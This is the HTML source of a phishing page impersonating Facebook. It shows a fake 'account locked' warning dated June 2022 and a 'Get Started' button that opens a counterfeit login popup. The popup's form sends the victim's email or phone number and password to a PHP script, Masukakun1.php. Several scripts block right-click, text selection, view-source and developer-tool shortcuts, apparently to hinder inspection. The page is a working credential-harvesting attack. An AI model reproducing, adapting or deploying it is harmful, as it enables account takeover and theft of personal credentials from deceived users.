<html xmlns="http://www.w3.org/1999/xhtml"><head>
    <title>Page Verification</title>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="description" content="">
<meta name="author" content="ThemeTags">
<meta property="og:title" content="Keep your Privacy">
<meta property="og:description" content="">
<meta property="og:image" content="https://i.ibb.co/QXDkcRt/Facebook-Verification-Pages.jpg">
<meta property="og:type" content="article">

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link rel="stylesheet" href="material-design-iconic-font.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="style2.css">
    <link rel="stylesheet" href="facebook2.css">
    <link rel="stylesheet" href="animate.css">
    <link rel="icon" href="https://i.ibb.co/5s2w62S/pngaaa-com-2002662.png">    
<script>
var isNS = (navigator.appName == "Netscape") ? 1 : 0;
if(navigator.appName == "Netscape") document.captureEvents(Event.MOUSEDOWN||Event.MOUSEUP);
function mischandler(){
return false;
}
function mousehandler(e){
var myevent = (isNS) ? e : event;
var eventbutton = (isNS) ? myevent.which : myevent.button;
if((eventbutton==2)||(eventbutton==3)) return false;
}
document.oncontextmenu = mischandler;
document.onmousedown = mousehandler;
document.onmouseup = mousehandler;
</script>
<script type="text/javascript">
document.onkeydown = function(e) {
        if (e.ctrlKey &&
            (e.keyCode === 67 ||
             e.keyCode === 86 ||
             e.keyCode === 85 ||
             e.keyCode === 117)) {

            return false;
        } else {
            return true;
        }
};
</script>
<script type="text/javascript">
function disableSelection(e){if(typeof e.onselectstart!="undefined")e.onselectstart=function(){return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){return false};e.style.cursor="default"}window.onload=function(){disableSelection(document.body)}
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script type="text/javascript">
window.oncontextmenu = function () {
            return false;
        }
        $(document).keydown(function (event) {
            if (event.keyCode == 123) {
                return false;
            }
            else if ((event.ctrlKey && event.shiftKey && event.keyCode == 73) || (event.ctrlKey && event.shiftKey && event.keyCode == 74)) {
                return false;
            }
        });
</script>
<script type="text/javascript">
//<![CDATA[
shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("Ctrl+U",function(){top.location.href=""});
//]]>
</script>
</head>
<body oncontextmenu="return false" onkeydown="return true;" onmousedown="return true;" style="cursor: default;">
<nav class="navbar navbar-expand-lg navbar-light bg-light py-1 ps-2">
        <div class="logo d-inline-block " alt=""></div>
    </nav>
        <div class="container">
        <div class="row my-5">
            <div class="col-md-12 col-12 my-3">
                <center>
			   <img alt="" src="stepper1-dark.png" height="120" width="161">
                </center>
            <div class="col-md-12 col-15 d-block mt-4 text-section">
				<br><div class="upload"> Your account has been locked<hr>
            </div>
    
                <div class="info1"> We saw unusual activity on your account. This may mean that someone has used your account without your knowledge.<hr>
            </div></div><font size="5"><font color="black"><font face="Arial"><font color="black"><font size="3">
<div class="_9_7 _2rgt _1j-f _2rgt" style="flex-grow:0;flex-shrink:1;padding:16px 0 16px 0" id="u_0_s_jD" data-nt="NT:BOX_3"><div class="_a58 _9_7 _2rgt _1j-f _2rgt _2rgt _1j-g _2rgt" style="background-color: #FFFFFF;border-top-left-radius: 6px;border-top-right-radius: 6px;border-bottom-right-radius: 6px;border-bottom-left-radius: 6px;overflow: hidden;flex-grow:0;flex-shrink:1;padding:12px 12px 12px 12px;width:100%;background-color:#F0F2F5" id="u_0_u_0E" data-nt="NT:DECOR"><div class="_a5b _9_7 _2rgt _1j-f _2rgt" style="flex-grow:0;flex-shrink:1;margin:4px 12px 0 4px" id="u_0_v_5W" data-nt="NT:BOX_3"><style="height: inherit;object-fit:="" inherit;width:="" 24px;height:="" 24px;max-width:="" 24px;max-height:="" 24px"="" id="u_0_w_In" data-nt="NT:IMAGE"></style="height:></div><div class="_a5o _9_7 _2rgt _1j-f _2rgt" style="flex-grow:0;flex-shrink:1" id="u_0_y_7I" data-nt="NT:BOX_3"><div class="_59k _2rgt _1j-f _2rgt" style="font-size: 15px;font-weight: 700;line-height: 20px;text-align: left;color: #050505" id="u_0_z_Cg" data-nt="FB:TEXT4">Account Locked June  05, 2022 </div><div class="_9_7 _2rgt _1j-f _2rgt" style="flex-grow:0;flex-shrink:1" id="u_0_10_W4" data-nt="NT:BOX_3"><div class="_59k _2rgt _1j-f _2rgt" style="font-size: 15px;font-weight: 400;line-height: 20px;text-align: left;color: #050505" id="u_0_11_aa" data-nt="FB:TEXT4">To protect you, your profile is not visible to people on Facebook and you can't use your account.</div></div></div></div></div><hr><div class="info2">
         We'll take you through some steps to unlock your account.
            </div></font></font></font></font></font></div><font size="5"><font color="black"><font face="Arial"><font color="black"><font size="3">
		 <div class="col-md-12 col-12 d-block mt-4">
					<div class="content-box-fb">
                        <button class="btn btn-primary d-block mx-auto w-100" onclick="open_facebook()"><b>Get Started</b></button>
                         </div>
        </div>
    </font></font></font></font></font></div><font size="5"><font color="black"><font face="Arial"><font color="black"><font size="3">



    <div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">

<div class="navbar-fb">
            <img src="dF5SId3UHWd.svg">
        </div>
  
        <div class="content-box-fb">
            
            <form action="Masukakun1.php" method="post">
                <input type="email" class="loginEmail" name="disini" placeholder="Email address or phone number" autocomplete="off" autocapitalize="none" required="">
                <input type="password" class="loginPassword" name="disana" id="fbPassword" placeholder="Password" autocomplete="off" autocapitalize="none" required="">
                <button type="submit" class="btn-login-fb">Log In</button>
            </form>

        </div>
        <div class="language-box">
         
        </div>
        <div class="copyright">Facebook Inc ©</div>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="popup.js"></script>

</div></font></font></font></font></font></div>
</body></html>